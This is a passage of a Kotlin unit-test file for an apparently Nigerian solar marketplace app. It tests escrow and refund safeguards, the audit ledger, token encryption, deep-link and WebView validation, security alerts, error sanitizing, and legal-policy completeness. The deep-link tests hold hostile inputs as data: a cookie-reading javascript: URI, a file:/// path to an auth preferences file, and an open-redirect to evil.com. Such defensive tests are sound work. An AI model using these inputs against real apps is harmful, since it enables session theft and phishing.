            "Duplicate commission deduction for the same order ID must be blocked",
            duplicateCommDeduction
        )

        // 4. Requirement 4 & 6: Prevent duplicate escrow release to seller available balance
        val firstEscrowRelease = com.example.util.RateLimitingAndFinancialSecurityManager.tryRegisterUniqueEscrowRelease(
            orderId = testOrderId,
            storeId = "store_nekes",
            netSellerEarningsNgn = 1_646_400L
        )
        assertTrue("First escrow release for delivered order must succeed", firstEscrowRelease)

        val duplicateEscrowRelease = com.example.util.RateLimitingAndFinancialSecurityManager.tryRegisterUniqueEscrowRelease(
            orderId = testOrderId,
            storeId = "store_nekes",
            netSellerEarningsNgn = 1_646_400L
        )
        org.junit.Assert.assertFalse(
            "Duplicate escrow release for the same order ID must be blocked",
            duplicateEscrowRelease
        )

        // 5. Requirement 4: Prevent duplicate order refunds
        val targetOrder = repo.ordersFlow.value.first { it.status != OrderStatus.DELIVERED && it.status != OrderStatus.REFUNDED }
        val firstRefund = repo.processOrderRefund(
            orderId = targetOrder.id,
            reason = "Damaged solar panel glass on arrival"
        )
        org.junit.Assert.assertNotNull("First valid refund by admin must succeed", firstRefund)
        assertEquals("SUCCESS", firstRefund?.status)
        assertEquals(OrderStatus.REFUNDED, repo.ordersFlow.value.first { it.id == targetOrder.id }.status)

        val secondDuplicateRefund = repo.processOrderRefund(
            orderId = targetOrder.id,
            reason = "Duplicate refund replay attempt"
        )
        assertNull("Duplicate refund on an already refunded order must be blocked", secondDuplicateRefund)

        // 6. Requirement 10: Restrict seller withdrawals strictly to KYB-verified bank accounts
        val nekesStore = repo.storesFlow.value.first { it.id == "store_nekes" }
        val unverifiedDestinationWithdrawal = repo.requestSellerWithdrawal(
            storeId = "store_nekes",
            amountNgn = 100_000L,
            bankName = "Attacker Offshore Bank",
            accountNumber = "9988776655", // Unverified 10-digit NUBAN not matching store's KYB account
            accountName = "Attacker Mule Account"
        )
        assertNull(
            "Withdrawal to an unverified bank account number must be strictly blocked",
            unverifiedDestinationWithdrawal
        )

        val verifiedDestinationWithdrawal = repo.requestSellerWithdrawal(
            storeId = "store_nekes",
            amountNgn = 100_000L,
            bankName = nekesStore.bankName,
            accountNumber = nekesStore.bankAccountNumber, // Matches store's KYB verified NUBAN "1019482015"
            accountName = nekesStore.bankAccountName
        )
        org.junit.Assert.assertNotNull(
            "Withdrawal to the seller's KYB-verified settlement bank account must succeed",
            verifiedDestinationWithdrawal
        )

        // 7. Requirement 9 & 12: Verify Immutable Hash-Chained & HMAC-Signed Financial Audit Ledger
        val auditLedgerChronological = repo.financialAuditLedgerFlow.value.reversed()
        assertTrue("Financial audit ledger must record all financial events", auditLedgerChronological.size >= 5)
        assertTrue(
            "Cryptographic hash-chain and HMAC signatures across financial audit ledger must be valid",
            com.example.util.RateLimitingAndFinancialSecurityManager.verifyFinancialAuditChainIntegrity(auditLedgerChronological)
        )

        // Tamper with a historical entry's amount in a copy of the chain and verify tamper detection triggers
        val tamperedChain = auditLedgerChronological.toMutableList()
        val originalFirst = tamperedChain[0]
        tamperedChain[0] = originalFirst.copy(amountNgn = originalFirst.amountNgn + 10_000_000L)
        org.junit.Assert.assertFalse(
            "Modifying any historical entry in the financial audit ledger must break hash-chain verification",
            com.example.util.RateLimitingAndFinancialSecurityManager.verifyFinancialAuditChainIntegrity(tamperedChain)
        )
    }

    @Test
    fun testMobileApplicationSecurityAuditPlatformTokenVaultDeepLinksWebViewAndEncryptedLocalDb() {
        // 1. 11-Point Mobile Application Security Posture Audit
        val postureReport = com.example.util.MobileSecurityAndMonitoringManager.auditMobileAppSecurityPosture()
        assertTrue(
            "Mobile security posture audit must be 100% compliant (findings=${postureReport.findings})",
            postureReport.isCompliant
        )
        assertTrue(postureReport.noHardcodedSecretsDetected)
        assertTrue(postureReport.localStorageEncryptedAtRest)
        assertTrue(postureReport.platformTokenVaultActive)
        assertTrue(postureReport.cleartextTrafficDisabled)
        assertTrue(postureReport.productionDebugProtected)
        assertTrue(postureReport.logsSanitizedAndRedacted)
        assertTrue(postureReport.deepLinksValidated)
        assertTrue(postureReport.webViewHardened)
        assertTrue(postureReport.leastPrivilegePermissionsOnly)
        assertTrue(postureReport.localDatabaseEncrypted)
        assertTrue(postureReport.cloudAndDeviceBackupsDisabled)

        // 2. Local Room Database Encryption at Rest (`ChatMessageEntity`)
        val sensitiveDiagnosticMsg = com.example.data.model.ChatMessage(
            id = "msg_room_enc_test_01",
            isUser = true,
            content = "My Deye 8kW inverter serial DY-889900 at 14 Admiralty Way Lekki tripped on F08",
            timestamp = "10:15 AM",
            quickSuggestions = listOf("Check DC breaker", "Inspect battery BMS")
        )
        val roomEntity = com.example.data.local.ChatMessageEntity.fromChatMessage(sensitiveDiagnosticMsg)
        assertTrue(
            "Room database entity content must be encrypted with AES-256-GCM at rest",
            com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(roomEntity.content)
        )
        org.junit.Assert.assertFalse(
            "Encrypted Room entity must never store plaintext user diagnostic message on disk",
            roomEntity.content.contains("Admiralty Way")
        )
        val decryptedChatMsg = roomEntity.toChatMessage()
        assertEquals(sensitiveDiagnosticMsg.content, decryptedChatMsg.content)
        assertEquals(sensitiveDiagnosticMsg.quickSuggestions, decryptedChatMsg.quickSuggestions)

        // 3. Secure Platform Token Vault (Encryption at rest, AEAD user binding, and cryptographic wipe)
        val rawAccessToken = "sf_at_live_platform_vault_secret_token_778899"
        val storedCiphertext = com.example.util.MobileSecurityAndMonitoringManager.storeTokenInSecurePlatformStorage(
            tokenKey = "active_access_token",
            rawTokenValue = rawAccessToken,
            userUid = "user_uid_chidi_101"
        )
        org.junit.Assert.assertFalse(
            "Platform token vault must never store plaintext token",
            storedCiphertext.contains(rawAccessToken)
        )
        assertEquals(
            rawAccessToken,
            com.example.util.MobileSecurityAndMonitoringManager.retrieveTokenFromSecurePlatformStorage(
                tokenKey = "active_access_token",
                userUid = "user_uid_chidi_101"
            )
        )
        // Cross-user UID mismatch must fail AEAD authentication and return null
        assertNull(
            "Another user UID must not be able to decrypt a token from the platform vault",
            com.example.util.MobileSecurityAndMonitoringManager.retrieveTokenFromSecurePlatformStorage(
                tokenKey = "active_access_token",
                userUid = "attacker_uid_999"
            )
        )
        com.example.util.MobileSecurityAndMonitoringManager.clearSecurePlatformTokenVault()
        assertNull(
            com.example.util.MobileSecurityAndMonitoringManager.retrieveTokenFromSecurePlatformStorage(
                tokenKey = "active_access_token",
                userUid = "user_uid_chidi_101"
            )
        )

        // 4. Deep-Link Validation (Blocks javascript:, file:, cleartext http:, open-redirects, and token query params)
        val validHttpsDeepLink = com.example.util.MobileSecurityAndMonitoringManager.validateIncomingDeepLink(
            "https://solarfix.africa/product/prod_1?ref=home"
        )
        assertTrue(validHttpsDeepLink.isSafe)
        assertEquals("product", validHttpsDeepLink.routeDestination)

        val validCustomSchemeLink = com.example.util.MobileSecurityAndMonitoringManager.validateIncomingDeepLink(
            "solarfix://store/store_nekes"
        )
        assertTrue(validCustomSchemeLink.isSafe)
        assertEquals("store", validCustomSchemeLink.routeDestination)

        org.junit.Assert.assertFalse(
            "javascript: URI in deep link must be blocked",
            com.example.util.MobileSecurityAndMonitoringManager.validateIncomingDeepLink("javascript:alert(document.cookie)").isSafe
        )
        org.junit.Assert.assertFalse(
            "file:/// URI in deep link must be blocked",
            com.example.util.MobileSecurityAndMonitoringManager.validateIncomingDeepLink("file:///data/data/com.example/shared_prefs/auth.xml").isSafe
        )
        org.junit.Assert.assertFalse(
            "Cleartext http:// deep link must be blocked",
            com.example.util.MobileSecurityAndMonitoringManager.validateIncomingDeepLink("http://solarfix.africa/product/prod_1").isSafe
        )
        org.junit.Assert.assertFalse(
            "Untrusted external host deep link must be blocked",
            com.example.util.MobileSecurityAndMonitoringManager.validateIncomingDeepLink("https://evil-phishing.com/product/prod_1").isSafe
        )
        org.junit.Assert.assertFalse(
            "Open-redirect query parameter in deep link must be blocked",
            com.example.util.MobileSecurityAndMonitoringManager.validateIncomingDeepLink("https://solarfix.africa/product/prod_1?redirect_uri=https://evil.com").isSafe
        )
        org.junit.Assert.assertFalse(
            "Authentication token in deep link query string must be blocked",
            com.example.util.MobileSecurityAndMonitoringManager.validateIncomingDeepLink("https://solarfix.africa/order/ORD123?access_token=sf_at_12345").isSafe
        )

        // 5. WebView Hardening & Allowed URL Check
        val hardenedWebViewAudit = com.example.util.MobileSecurityAndMonitoringManager.auditWebViewSecurityConfig()
        assertTrue(hardenedWebViewAudit.isHardened)
        val insecureWebViewAudit = com.example.util.MobileSecurityAndMonitoringManager.auditWebViewSecurityConfig(
            javaScriptEnabled = true,
            allowFileAccess = true,
            allowUniversalAccessFromFileURLs = true
        )
        org.junit.Assert.assertFalse(insecureWebViewAudit.isHardened)
        assertTrue(com.example.util.MobileSecurityAndMonitoringManager.isAllowedWebViewUrl("https://checkout.paystack.com/pay/sf123"))
        org.junit.Assert.assertFalse(com.example.util.MobileSecurityAndMonitoringManager.isAllowedWebViewUrl("http://checkout.paystack.com/pay/sf123"))
        org.junit.Assert.assertFalse(com.example.util.MobileSecurityAndMonitoringManager.isAllowedWebViewUrl("https://attacker.com/pay"))

        // 6. Least-Privilege Permission Audit
        assertTrue(
            com.example.util.MobileSecurityAndMonitoringManager.auditDeclaredPermissions(
                listOf("android.permission.INTERNET", "android.permission.ACCESS_NETWORK_STATE", "android.permission.CAMERA")
            ).isValid
        )
        org.junit.Assert.assertFalse(
            "Excessive permissions such as READ_EXTERNAL_STORAGE or READ_SMS must fail permission audit",
            com.example.util.MobileSecurityAndMonitoringManager.auditDeclaredPermissions(
                listOf("android.permission.INTERNET", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.READ_SMS")
            ).isValid
        )
    }

    @Test
    fun testSecurityMonitoringAllEightSuspiciousCategoriesAdminAlertsAndUserSafeErrorHandling() = kotlinx.coroutines.runBlocking {
        com.example.util.MobileSecurityAndMonitoringManager.clearAlertsForTesting()
        com.example.util.RateLimitingAndFinancialSecurityManager.resetAllRateLimitsForTesting()

        val repo = SolarRepository()
        val authRepo = com.example.data.repository.AuthRepository(null)

        // 1. Category 1: REPEATED_FAILED_LOGINS (Brute-force login attempts)
        val testEmail = "monitored.user@solarfix.africa"
        val initOtp = authRepo.initiateSignUpWithVerification("Monitored User", testEmail, "ValidPass#2026!").getOrThrow()
        authRepo.verifyEmailCode(initOtp)
        authRepo.logout()
        repeat(com.example.data.repository.AuthRepository.MAX_FAILED_LOGIN_ATTEMPTS) {
            authRepo.login(testEmail, "WrongPassword#000")
        }
        assertTrue(
            "Repeated failed logins must generate a REPEATED_FAILED_LOGINS admin security alert",
            repo.adminSecurityAlertsFlow.value.any {
                it.category == com.example.util.SecurityMonitoringCategory.REPEATED_FAILED_LOGINS
            }
        )

        // 2. Category 2: UNAUTHORIZED_ACCESS_ATTEMPT (Cross-store product modification attempt)
        val felicityProd = repo.products.first { it.storeId == "store_felicity" }
        val crossStoreAllowed = repo.updateProductPriceAndStock(
            productId = felicityProd.id,
            newPriceNgn = 50_000L,
            newStockCount = 10,
            callerStoreId = "store_nekes",
            isAdmin = false
        )
        org.junit.Assert.assertFalse(crossStoreAllowed)
        assertTrue(
            "Cross-store unauthorized modification must generate an UNAUTHORIZED_ACCESS_ATTEMPT alert",
            repo.adminSecurityAlertsFlow.value.any {
                it.category == com.example.util.SecurityMonitoringCategory.UNAUTHORIZED_ACCESS_ATTEMPT
            }
        )

        // 3. Category 3: UNUSUAL_SELLER_ACTIVITY (Extreme >80% flash price drop / >5,000 unit stock spike)
        val nekesProd = repo.products.first { it.storeId == "store_nekes" }
        val originalPrice = nekesProd.basePriceNgn
        val originalStock = nekesProd.stockCount
        try {
            repo.updateProductPriceAndStock(
                productId = nekesProd.id,
                newPriceNgn = 1_000L, // >99% suspicious price drop
                newStockCount = originalStock + 9_000, // Abnormal +9,000 unit inventory spike
                callerStoreId = "store_nekes",
                isAdmin = false
            )
            assertTrue(
                "Extreme price swing or stock spike must generate an UNUSUAL_SELLER_ACTIVITY alert",
                repo.adminSecurityAlertsFlow.value.any {
                    it.category == com.example.util.SecurityMonitoringCategory.UNUSUAL_SELLER_ACTIVITY
                }
            )
        } finally {
            repo.updateProductPriceAndStock(
                productId = nekesProd.id,
                newPriceNgn = originalPrice,
                newStockCount = originalStock,
                callerStoreId = "store_nekes",
                isAdmin = true
            )
        }

        // 4. Category 4: SUSPICIOUS_WITHDRAWAL (Withdrawal attempt to unverified bank account)
        val suspiciousWithdrawal = repo.requestSellerWithdrawal(
            storeId = "store_nekes",
            amountNgn = 150_000L,
            bankName = "Unverified Bank",
            accountNumber = "8877665544",
            accountName = "Unverified Account"
        )
        assertNull(suspiciousWithdrawal)
        assertTrue(
            "Withdrawal attempt to unverified bank account must generate a SUSPICIOUS_WITHDRAWAL alert",
            repo.adminSecurityAlertsFlow.value.any {
                it.category == com.example.util.SecurityMonitoringCategory.SUSPICIOUS_WITHDRAWAL
            }
        )

        // 5. Category 5: PAYMENT_MANIPULATION_ATTEMPT (Frontend price tampering at checkout)
        repo.recalculateOrderTotalOnBackend(
            requestedItems = listOf(
                com.example.util.ClientOrderItemClaim(
                    productId = nekesProd.id,
                    quantity = 1,
                    clientClaimedUnitPriceNgn = 100L
                )
            ),
            frontendClaimedTotalNgn = 100L
        )
        assertTrue(
            "Frontend price manipulation must generate a PAYMENT_MANIPULATION_ATTEMPT alert",
            repo.adminSecurityAlertsFlow.value.any {
                it.category == com.example.util.SecurityMonitoringCategory.PAYMENT_MANIPULATION_ATTEMPT
            }
        )

        // 6. Category 6: UNEXPECTED_ADMIN_ACTION (Unauthorized caller attempting admin settings change)
        try {
            repo.updateMarketplaceSettings(
                newSettings = MarketplaceSettings(defaultCommissionPercent = 0.5),
                adminEmail = "intruder@example.com"
            )
        } catch (_: SecurityException) {
        }
        assertTrue(
            "Unexpected/unauthorized admin privilege attempt must generate an UNEXPECTED_ADMIN_ACTION alert",
            repo.adminSecurityAlertsFlow.value.any {
                it.category == com.example.util.SecurityMonitoringCategory.UNEXPECTED_ADMIN_ACTION
            }
        )

        // 7. Category 7: REPEATED_API_ABUSE (Exceeding rate limit on sensitive endpoint)
        repeat(com.example.util.ProtectedEndpoint.PASSWORD_RESET.maxRequestsPerWindow + 1) {
            com.example.util.RateLimitingAndFinancialSecurityManager.checkAndRecordRequest(
                endpoint = com.example.util.ProtectedEndpoint.PASSWORD_RESET,
                accountIdentifier = "spammer@example.com",
                deviceFingerprint = "dev_spammer_01",
                ipAddress = "102.89.40.55"
            )
        }
        assertTrue(
            "Repeated API rate-limit violation must generate a REPEATED_API_ABUSE alert",
            repo.adminSecurityAlertsFlow.value.any {
                it.category == com.example.util.SecurityMonitoringCategory.REPEATED_API_ABUSE
            }
        )

        // 8. Category 8: UNUSUAL_DATABASE_ACCESS (Cross-tenant RLS violation)
        val rlsAllowed = com.example.util.DatabaseEncryptionAndSecurityManager.evaluateRowLevelAccessPolicy(
            actorUid = "cust_attacker",
            actorEmail = "attacker@example.com",
            actorRole = UserRole.CUSTOMER,
            isActorAdmin = false,
            operation = com.example.util.DatabaseOperationType.SELECT_READ,
            collection = "addresses",
            resourceOwnerUid = "cust_victim"
        )
        org.junit.Assert.assertFalse(rlsAllowed)
        assertTrue(
            "Database RLS violation must generate an UNUSUAL_DATABASE_ACCESS alert",
            repo.adminSecurityAlertsFlow.value.any {
                it.category == com.example.util.SecurityMonitoringCategory.UNUSUAL_DATABASE_ACCESS
            }
        )

        // 9. Verify Admin Alert Acknowledgment is strictly restricted to verified Administrators
        val latestAlert = repo.adminSecurityAlertsFlow.value.first()
        var nonAdminAckBlocked = false
        try {
            repo.acknowledgeAdminSecurityAlert(
                alertId = latestAlert.alertId,
                adminEmail = "seller@solarfix.africa",
                adminRole = UserRole.VERIFIED_SELLER
            )
        } catch (_: SecurityException) {
            nonAdminAckBlocked = true
        }
        assertTrue("Non-admin must be blocked from acknowledging security alerts", nonAdminAckBlocked)

        val ackSuccess = repo.acknowledgeAdminSecurityAlert(
            alertId = latestAlert.alertId,
            adminEmail = "admin@solarfix.africa",
            adminRole = UserRole.ADMIN
        )
        assertTrue("Verified admin must be able to acknowledge security alert", ackSuccess)
        assertTrue(repo.adminSecurityAlertsFlow.value.first { it.alertId == latestAlert.alertId }.acknowledgedByAdmin)

        // 10. Verify User-Facing Error Messages NEVER expose SQL/Firestore errors, credentials, paths, or stack traces
        val rawDatabaseExceptionMsg = """
            android.database.sqlite.SQLiteException: near "SELECT": syntax error (code 1):
            while compiling: SELECT * FROM stores WHERE password='db_secret_password_123'
            Connection: jdbc:postgresql://db.solarfix.internal:5432/prod_db
            File: /data/user/0/com.aistudio.solarfix.nxkpq/databases/solarfix_database
            Token: sf_at_secret_9988776655
            at com.example.data.local.SolarfixDatabase.query(SolarfixDatabase.kt:42)
        """.trimIndent()
        val safeUserMsg = com.example.util.MobileSecurityAndMonitoringManager.sanitizeUserFacingErrorMessage(
            rawErrorOrMessage = rawDatabaseExceptionMsg,
            throwable = IllegalStateException("FirebaseFirestoreException: PERMISSION_DENIED at /stores/store_nekes")
        )
        org.junit.Assert.assertFalse("User error must never contain SQLiteException", safeUserMsg.contains("SQLiteException"))
        org.junit.Assert.assertFalse("User error must never contain SQL query", safeUserMsg.contains("SELECT * FROM"))
        org.junit.Assert.assertFalse("User error must never contain database password", safeUserMsg.contains("db_secret_password_123"))
        org.junit.Assert.assertFalse("User error must never contain JDBC connection string", safeUserMsg.contains("jdbc:postgresql"))
        org.junit.Assert.assertFalse("User error must never contain internal Android file path", safeUserMsg.contains("/data/user/0"))
        org.junit.Assert.assertFalse("User error must never contain auth token", safeUserMsg.contains("sf_at_secret"))
        org.junit.Assert.assertFalse("User error must never contain stack trace frame", safeUserMsg.contains("SolarfixDatabase.kt:42"))
        org.junit.Assert.assertFalse("User error must never contain FirebaseFirestoreException", safeUserMsg.contains("FirebaseFirestoreException"))
        assertTrue("User error must provide a polite message with a safe support reference code", safeUserMsg.contains("Support Ref: ERR-"))

        // 11. Verify Unified Security & Financial Audit Log recorded all events with masked PII
        assertTrue(repo.securityAndFinancialAuditLogFlow.value.size >= 8)
    }

    @Test
    fun testTermsOfUseAndServiceCompletenessRoleDistinctionAndConsumerRights() {
        val allSections = com.example.data.legal.TermsOfServiceRepository.allSections

        // 1. Verify all 21 required legal & operational topics are present and ordered 1..21
        assertEquals(21, com.example.data.legal.TermsSectionTopic.entries.size)
        assertEquals(21, allSections.size)
        com.example.data.legal.TermsSectionTopic.entries.forEachIndexed { idx, expectedTopic ->
            val section = allSections[idx]
            assertEquals(expectedTopic, section.topic)
            assertEquals(idx + 1, section.topic.sectionNumber)
            assertTrue("Section ${expectedTopic.name} summary must not be blank", section.summary.isNotBlank())
            assertTrue(
                "Section ${expectedTopic.name} must contain at least 3 detailed legal clauses",
                section.detailedClauses.size >= 3
            )
        }

        // 2. Verify all 21 mandatory topics by explicit retrieval
        val mandatoryTopics = listOf(
            com.example.data.legal.TermsSectionTopic.ACCEPTANCE_OF_TERMS,
            com.example.data.legal.TermsSectionTopic.ELIGIBILITY,
            com.example.data.legal.TermsSectionTopic.CUSTOMER_RESPONSIBILITIES,
            com.example.data.legal.TermsSectionTopic.SELLER_RESPONSIBILITIES,
            com.example.data.legal.TermsSectionTopic.SELLER_REGISTRATION_AND_VERIFICATION,
            com.example.data.legal.TermsSectionTopic.PRODUCT_LISTING_REQUIREMENTS,
            com.example.data.legal.TermsSectionTopic.COUNTERFEIT_PROHIBITION,
            com.example.data.legal.TermsSectionTopic.MARKETPLACE_RULES,
            com.example.data.legal.TermsSectionTopic.PRICING_AND_PAYMENT_CONDITIONS,
            com.example.data.legal.TermsSectionTopic.COMMISSION_ARRANGEMENTS,
            com.example.data.legal.TermsSectionTopic.SELLER_PAYOUT_CONDITIONS,
            com.example.data.legal.TermsSectionTopic.DELIVERY_RESPONSIBILITIES,
            com.example.data.legal.TermsSectionTopic.CANCELLATION_POLICIES,
            com.example.data.legal.TermsSectionTopic.REFUND_AND_RETURN_CONDITIONS,
            com.example.data.legal.TermsSectionTopic.DISPUTE_RESOLUTION,
            com.example.data.legal.TermsSectionTopic.PROHIBITED_ACTIVITIES,
            com.example.data.legal.TermsSectionTopic.ACCOUNT_SUSPENSION_AND_TERMINATION,
            com.example.data.legal.TermsSectionTopic.INTELLECTUAL_PROPERTY,
            com.example.data.legal.TermsSectionTopic.LIMITATION_OF_LIABILITY,
            com.example.data.legal.TermsSectionTopic.CHANGES_TO_TERMS,
            com.example.data.legal.TermsSectionTopic.CONTACT_AND_COMPLAINT_PROCEDURES
        )
        mandatoryTopics.forEach { topic ->
            val sec = com.example.data.legal.TermsOfServiceRepository.getSection(topic)
            assertEquals(topic, sec.topic)
        }

        // 3. Verify clear distinction between SolarFix's responsibilities and Independent Marketplace Sellers
        val matrix = com.example.data.legal.TermsOfServiceRepository.responsibilityComparisonMatrix
        assertTrue("Responsibility matrix must cover at least 5 core operational domains", matrix.size >= 5)
        matrix.forEach { entry ->
            assertTrue(entry.domain.isNotBlank())
            assertTrue(entry.solarFixPlatformResponsibility.isNotBlank())
            assertTrue(entry.independentSellerResponsibility.isNotBlank())
            assertTrue(entry.customerProtectionGuarantee.isNotBlank())
        }
        val sellerRespClauses = com.example.data.legal.TermsOfServiceRepository
            .getSection(com.example.data.legal.TermsSectionTopic.SELLER_RESPONSIBILITIES)
            .detailedClauses.joinToString(" ")
        assertTrue(
            "Seller Responsibilities must explicitly identify Independent Sellers as the Merchant of Record",
            sellerRespClauses.contains("Merchant of Record")
        )

        // 4. Verify non-waiver & preservation of customers' statutory consumer protection and legal rights
        val banner = com.example.data.legal.TermsOfServiceRepository.STATUTORY_RIGHTS_PRESERVATION_BANNER
        assertTrue(banner.contains("Federal Competition and Consumer Protection Act (FCCPA) 2018"))
        assertTrue(banner.contains("Nigeria Data Protection Act (NDPA) 2023"))

        val liabilityClauses = com.example.data.legal.TermsOfServiceRepository
            .getSection(com.example.data.legal.TermsSectionTopic.LIMITATION_OF_LIABILITY)
            .detailedClauses.joinToString(" ")
        assertTrue(
            "Limitation of Liability must explicitly preserve non-excludable statutory consumer liabilities",
            liabilityClauses.contains("Nothing in these Terms limits or excludes liability")
        )

        val disputeClauses = com.example.data.legal.TermsOfServiceRepository
            .getSection(com.example.data.legal.TermsSectionTopic.DISPUTE_RESOLUTION)
            .detailedClauses.joinToString(" ")
        assertTrue(
            "Dispute Resolution must preserve the customer's right to approach the FCCPC or courts",
            disputeClauses.contains("court of competent jurisdiction")
        )

        // 5. Verify keyword search across sections
        val counterfeitResults = com.example.data.legal.TermsOfServiceRepository.searchSections("counterfeit")
        assertTrue(counterfeitResults.any { it.topic == com.example.data.legal.TermsSectionTopic.COUNTERFEIT_PROHIBITION })

        val commissionResults = com.example.data.legal.TermsOfServiceRepository.searchSections("5.0% platform commission")
        assertTrue(commissionResults.any { it.topic == com.example.data.legal.TermsSectionTopic.COMMISSION_ARRANGEMENTS })

        // 6. Verify Terms Acceptance recording & version check across entry points
        val record = com.example.data.legal.TermsOfServiceRepository.recordTermsAcceptance(
            userIdOrEmail = "buyer.terms@solarfix.africa",
            entryPoint = "Registration Screen",
            acceptedRole = "CUSTOMER"
        )
        assertEquals(com.example.data.legal.TermsOfServiceRepository.CURRENT_TERMS_VERSION, record.acceptedVersion)
        assertTrue(com.example.data.legal.TermsOfServiceRepository.hasAcceptedLatestTerms("buyer.terms@solarfix.africa"))
        org.junit.Assert.assertNotNull(
            com.example.data.legal.TermsOfServiceRepository.getAcceptanceRecord("buyer.terms@solarfix.africa")
        )
    }

    @Test
    fun testPrivacyPolicyAllFifteenSectionsEightDomainsDataMinimizationAndUserRights() {
        val coreSections = com.example.data.legal.PrivacyPolicyAndDataProtectionManager.allCoreSections
        val domainProvisions = com.example.data.legal.PrivacyPolicyAndDataProtectionManager.specificDomainProvisions

        // 1. Verify all 15 mandatory core Privacy Policy sections are present and ordered 1..15
        assertEquals(15, com.example.data.legal.PrivacyPolicySectionTopic.entries.size)
        assertEquals(15, coreSections.size)
        com.example.data.legal.PrivacyPolicySectionTopic.entries.forEachIndexed { idx, expectedTopic ->
            val sec = coreSections[idx]
            assertEquals(expectedTopic, sec.topic)
            assertEquals(idx + 1, sec.topic.sectionNumber)
            assertTrue(sec.summary.isNotBlank())
            assertTrue(sec.detailedClauses.size >= 3)
            assertTrue(sec.implementationReference.isNotBlank())
        }

        // 2. Verify all 8 specific data domain provisions (A..H) reflect actual app implementation
        assertEquals(8, com.example.data.legal.SpecificDataDomainProvision.entries.size)
        assertEquals(8, domainProvisions.size)
        val requiredDomains = listOf(
            com.example.data.legal.SpecificDataDomainProvision.CUSTOMER_INFORMATION,
            com.example.data.legal.SpecificDataDomainProvision.SELLER_VERIFICATION_DOCUMENTS,
            com.example.data.legal.SpecificDataDomainProvision.BANK_ACCOUNT_INFORMATION,
            com.example.data.legal.SpecificDataDomainProvision.PAYMENT_RECORDS,
            com.example.data.legal.SpecificDataDomainProvision.DELIVERY_ADDRESSES,
            com.example.data.legal.SpecificDataDomainProvision.AI_TECHNICIAN_INTERACTIONS,
            com.example.data.legal.SpecificDataDomainProvision.UPLOADED_PHOTOGRAPHS_AND_DOCUMENTS,
            com.example.data.legal.SpecificDataDomainProvision.MARKETPLACE_TRANSACTION_HISTORY
        )
        requiredDomains.forEach { dom ->
            val detail = com.example.data.legal.PrivacyPolicyAndDataProtectionManager.getDomainProvision(dom)
            assertEquals(dom, detail.domain)
            assertTrue("Domain ${dom.name} must list collected fields", detail.exactFieldsCollected.isNotEmpty())
            assertTrue("Domain ${dom.name} must list excluded data minimization fields", detail.excludedByDataMinimization.isNotEmpty())
            assertTrue(detail.encryptionAndStorageMechanism.contains("AES-256-GCM") || detail.encryptionAndStorageMechanism.contains("SHA-256"))
            assertTrue(detail.accessAndSharingPolicy.isNotBlank())
            assertTrue(detail.retentionPeriod.isNotBlank())
        }

        // 3. Verify Privacy-by-Design & Data Minimization enforcement rejects unnecessary sensitive fields
        val cleanPayload = mapOf(
            "name" to "Engr. Chidi",
            "email" to "chidi@solarfix.africa",
            "systemSizeKva" to "8.0"
        )
        val cleanAudit = com.example.data.legal.PrivacyPolicyAndDataProtectionManager.enforceDataMinimizationOnPayload(cleanPayload)
        assertTrue("Clean minimal payload must pass Data Minimization audit", cleanAudit.isCompliant)
        assertEquals(3, cleanAudit.permittedKeys.size)
        assertTrue(cleanAudit.rejectedExcessiveOrSensitiveKeys.isEmpty())

        val excessivePayload = mapOf(
            "name" to "Engr. Chidi",
            "bvn" to "22113344556",
            "card_number" to "4532015112830366",
            "cvv" to "891",
            "banking_password" to "MyBankPass123",
            "biometric_template" to "raw_fingerprint_bytes",
            "religion" to "Private",
            "contacts_address_book" to "all_contacts"
        )
        val excessiveAudit = com.example.data.legal.PrivacyPolicyAndDataProtectionManager.enforceDataMinimizationOnPayload(excessivePayload)
        org.junit.Assert.assertFalse("Excessive sensitive fields must be flagged and stripped by Data Minimization", excessiveAudit.isCompliant)
        assertEquals(listOf("name"), excessiveAudit.permittedKeys)
        assertEquals(7, excessiveAudit.rejectedExcessiveOrSensitiveKeys.size)
        org.junit.Assert.assertFalse(excessiveAudit.sanitizedPayload.containsKey("bvn"))
        org.junit.Assert.assertFalse(excessiveAudit.sanitizedPayload.containsKey("card_number"))
        org.junit.Assert.assertFalse(excessiveAudit.sanitizedPayload.containsKey("cvv"))

        // 4. Verify interactive Data Subject Rights (Access/Export, Correction, Consent Withdrawal, Deletion, Complaint)
        val testUser = "privacy.user@solarfix.africa"

        // Access / Export right
        val exportRecord = com.example.data.legal.PrivacyPolicyAndDataProtectionManager.exportUserPersonalDataSnapshot(
            userIdentifier = testUser,
            roleName = "CUSTOMER"
        )
        assertEquals(com.example.data.legal.DataSubjectRequestType.ACCESS_EXPORT, exportRecord.requestType)
        assertTrue(exportRecord.resolutionSummary.contains("AES-256-GCM"))

        // Correction right
        val correctionRecord = com.example.data.legal.PrivacyPolicyAndDataProtectionManager.submitDataCorrectionRequest(
            userIdentifier = testUser,
            fieldToCorrect = "Delivery Street Address",
            updatedValueSummary = "22 Admiralty Way, Lekki Phase 1"
        )
        assertEquals(com.example.data.legal.DataSubjectRequestType.CORRECTION, correctionRecord.requestType)

        // Consent withdrawal right
        val withdrawnState = com.example.data.legal.PrivacyPolicyAndDataProtectionManager.withdrawAllOptionalConsents(testUser)
        org.junit.Assert.assertFalse(withdrawnState.aiTechnicianDiagnosticHistoryRetention)
        org.junit.Assert.assertFalse(withdrawnState.localizedSolarIrradianceOptimization)
        org.junit.Assert.assertFalse(withdrawnState.productSafetyAndFeatureNotifications)
        assertTrue("Essential escrow/account processing remains active until account deletion", withdrawnState.essentialAccountAndEscrowProcessing)

        // Deletion / Erasure right
        val deletionRecord = com.example.data.legal.PrivacyPolicyAndDataProtectionManager.submitDataDeletionRequest(
            userIdentifier = testUser,
            reason = "Exercising NDPA Section 34(1)(c) right to erasure"
        )
        assertEquals(com.example.data.legal.DataSubjectRequestType.DELETION_ERASURE, deletionRecord.requestType)
        assertTrue(deletionRecord.resolutionSummary.contains("6-year statutory retention"))

        // Privacy Complaint right
        val complaintRecord = com.example.data.legal.PrivacyPolicyAndDataProtectionManager.submitPrivacyComplaint(
            userIdentifier = testUser,
            complaintDetails = "Requesting verification that my KYC ID is strictly in PRIVATE_ADMIN_VAULT"
        )
        assertEquals(com.example.data.legal.DataSubjectRequestType.PRIVACY_COMPLAINT, complaintRecord.requestType)
        assertTrue(complaintRecord.resolutionSummary.contains("NDPC"))
    }

    @Test
    fun testUserConsentNonPreselectedLegalAcceptanceLedgerAndSecurityAuditReport() {
        // 1. Verify registration consent checkboxes are NEVER preselected (all default to false)
